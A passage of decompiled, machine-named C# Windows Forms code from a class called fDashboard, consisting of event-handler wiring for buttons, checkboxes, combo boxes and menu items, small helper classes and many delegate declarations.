        this.visualButton_21 = visualButton_24;
        button = this.visualButton_21;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_804()
    {
        return this.visualButton_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_805(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_280);
        VisualButton button = this.visualButton_22;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_22 = visualButton_24;
        button = this.visualButton_22;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_806()
    {
        return this.pictureBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_807(PictureBox pictureBox_7)
    {
        EventHandler handler = new EventHandler(this.method_279);
        PictureBox box = this.pictureBox_6;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_6 = pictureBox_7;
        box = this.pictureBox_6;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_808()
    {
        return this.label_29;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_809(Label label_30)
    {
        this.label_29 = label_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(Label label_30)
    {
        this.label_1 = label_30;
    }

    internal virtual BackgroundWorker vmethod_810()
    {
        return this.backgroundWorker_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_811(BackgroundWorker backgroundWorker_4)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_272);
        BackgroundWorker worker = this.backgroundWorker_3;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_3 = backgroundWorker_4;
        worker = this.backgroundWorker_3;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_812()
    {
        return this.toolStripMenuItem_135;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_813(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_285);
        ToolStripMenuItem item = this.toolStripMenuItem_135;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_135 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_135;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_814()
    {
        return this.toolStripSeparator_38;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_815(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_38 = toolStripSeparator_39;
    }

    internal virtual VisualButton vmethod_816()
    {
        return this.visualButton_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_817(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_286);
        VisualButton button = this.visualButton_23;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_23 = visualButton_24;
        button = this.visualButton_23;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_818()
    {
        return this.checkBox_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_819(CheckBox checkBox_8)
    {
        EventHandler handler = new EventHandler(this.method_288);
        CheckBox box = this.checkBox_7;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_7 = checkBox_8;
        box = this.checkBox_7;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual ComboBox vmethod_82()
    {
        return this.comboBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(ComboBox comboBox_9)
    {
        EventHandler handler = new EventHandler(this.method_74);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_170);
        ComboBox box = this.comboBox_0;
        if (box != null)
        {
            box.SelectedIndexChanged -= handler;
            box.KeyDown -= handler2;
        }
        this.comboBox_0 = comboBox_9;
        box = this.comboBox_0;
        if (box != null)
        {
            box.SelectedIndexChanged += handler;
            box.KeyDown += handler2;
        }
    }

    internal virtual Label vmethod_84()
    {
        return this.label_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(Label label_30)
    {
        this.label_2 = label_30;
    }

    internal virtual VisualButton vmethod_86()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_72);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_24;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_88()
    {
        return this.comboBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(ComboBox comboBox_9)
    {
        EventHandler handler = new EventHandler(this.method_78);
        ComboBox box = this.comboBox_1;
        if (box != null)
        {
            box.SelectedIndexChanged -= handler;
        }
        this.comboBox_1 = comboBox_9;
        box = this.comboBox_1;
        if (box != null)
        {
            box.SelectedIndexChanged += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_20);
        ToolStripMenuItem item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_2 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual Label vmethod_90()
    {
        return this.label_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(Label label_30)
    {
        this.label_3 = label_30;
    }

    internal virtual Label vmethod_92()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(Label label_30)
    {
        this.label_4 = label_30;
    }

    internal virtual CheckBox vmethod_94()
    {
        return this.checkBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(CheckBox checkBox_8)
    {
        EventHandler handler = new EventHandler(this.method_167);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_176);
        CheckBox box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged -= handler;
            box.KeyDown -= handler2;
        }
        this.checkBox_0 = checkBox_8;
        box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged += handler;
            box.KeyDown += handler2;
        }
    }

    internal virtual CheckBox vmethod_96()
    {
        return this.checkBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(CheckBox checkBox_8)
    {
        EventHandler handler = new EventHandler(this.method_75);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_175);
        CheckBox box = this.checkBox_1;
        if (box != null)
        {
            box.CheckedChanged -= handler;
            box.KeyDown -= handler2;
        }
        this.checkBox_1 = checkBox_8;
        box = this.checkBox_1;
        if (box != null)
        {
            box.CheckedChanged += handler;
            box.KeyDown += handler2;
        }
    }

    internal virtual RadioButton vmethod_98()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_99(RadioButton radioButton_2)
    {
        EventHandler handler = new EventHandler(this.method_76);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_178);
        RadioButton button = this.radioButton_0;
        if (button != null)
        {
            button.CheckedChanged -= handler;
            button.KeyDown -= handler2;
        }
        this.radioButton_0 = radioButton_2;
        button = this.radioButton_0;
        if (button != null)
        {
            button.CheckedChanged += handler;
            button.KeyDown += handler2;
        }
    }

    internal sealed class Class123
    {
        public int int_0;
        public fDashboard fDashboard_0;

        internal void _Lambda$__0()
        {
            this.fDashboard_0.method_116(Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.fDashboard_0.concurrentStack_1, this.int_0));
        }
    }

    internal sealed class Class124
    {
        public string string_0;
        public fDashboard.Class125 class125_0;

        internal void _Lambda$__0()
        {
            FolderBrowserDialog dialog;
            string selectedPath = (dialog = this.class125_0.folderBrowserDialog_0).SelectedPath;
            this.class125_0.fDashboard_0.method_50(ref selectedPath, ref this.string_0);
            dialog.SelectedPath = selectedPath;
        }
    }

    internal sealed class Class125
    {
        public FolderBrowserDialog folderBrowserDialog_0;
        public fDashboard fDashboard_0;
    }

    private sealed class Class126
    {
        public string string_0;
        public string string_1;
        public string string_2;
        public string string_3;
        public string string_4;
        public string string_5;
        public string string_6;
        public string string_7;
        public string string_8;
        public Image image_0;

        public Class126(string string_9, string string_10, string string_11, string string_12, string string_13, string string_14, string string_15, string string_16, string string_17, Image image_1)
        {
            this.string_0 = string_9;
            this.string_1 = string_10;
            this.string_2 = string_11;
            this.string_3 = string_12;
            this.string_4 = string_13;
            this.string_5 = string_14;
            this.string_6 = string_15;
            this.string_7 = string_16;
            this.string_8 = string_17;
            this.image_0 = image_1;
        }
    }

    internal sealed class Class127
    {
        private string string_0;
        private Image image_0;

        public Class127() : this(null, null)
        {
        }

        public Class127(string string_1) : this(string_1, null)
        {
        }

        public Class127(string string_1, Image image_1)
        {
            this.method_1(string_1);
            this.method_3(image_1);
        }

        public string method_0()
        {
            return this.string_0;
        }

        public void method_1(string string_1)
        {
            this.string_0 = string_1;
        }

        public Image method_2()
        {
            return this.image_0;
        }

        public void method_3(Image image_1)
        {
            this.image_0 = image_1;
        }
    }

    private sealed class Class128
    {
        public string string_0;
        public string string_1;
        public string string_2;
        public string string_3;
        public string string_4;
        public string string_5;
        public Image image_0;

        public Class128(string string_6, string string_7, string string_8, string string_9, string string_10, string string_11, Image image_1)
        {
            this.string_0 = string_6;
            this.string_1 = string_7;
            this.string_2 = string_8;
            this.string_3 = string_9;
            this.string_4 = string_10;
            this.string_5 = string_11;
            this.image_0 = image_1;
        }
    }

    private delegate void Delegate10(ref string string_0);

    private delegate void Delegate11(ref long long_0);

    private delegate void Delegate12(ref string[] string_0);

    private delegate void Delegate13();

    private delegate void Delegate14(ref long long_0, ref string string_0);

    private delegate void Delegate15(ref string[] string_0);

    private delegate void Delegate16(ref string string_0);

    private delegate void Delegate17(ref bool bool_0);

    private delegate void Delegate18(ref long long_0, ref string string_0);

    private delegate void Delegate19(ref string string_0);

    private delegate void Delegate2(ref string string_0);

    private delegate void Delegate20(ref string string_0);

    private delegate void Delegate21(ref string string_0);

    private delegate void Delegate22(ref string string_0);

    private delegate void Delegate23(ref bool bool_0);

    private delegate void Delegate24();

    private delegate void Delegate25(ref string string_0);

    private delegate void Delegate26(ref string string_0);

    private delegate void Delegate27();

    private delegate void Delegate28(string string_0);

    private delegate void Delegate29();

    private delegate void Delegate3(ref string string_0);

    private delegate void Delegate30();

    private delegate void Delegate31(int int_0);

    private delegate void Delegate32(ref string string_0);

    private delegate void Delegate33();

    private delegate void Delegate34(ref string string_0);

    private delegate void Delegate35(ref string string_0);

    private delegate void Delegate36(ref string string_0);

    private delegate void Delegate37(string string_0, Color color_0);

    private delegate void Delegate38(ref bool bool_0);

    private delegate void Delegate39(ref string string_0, string string_1);

    private delegate void Delegate4(ref string string_0, Color color_0);

    private delegate void Delegate40(ref string string_0);

    private delegate void Delegate41();

    private delegate void Delegate42(ref long long_0);

    private delegate void Delegate5(ref string string_0);

    private delegate void Delegate6(ref string string_0);

    private delegate void Delegate7(ref string string_0, string string_1);

    private delegate void Delegate8(ref string string_0);

    private delegate void Delegate9(ref string string_0);
}

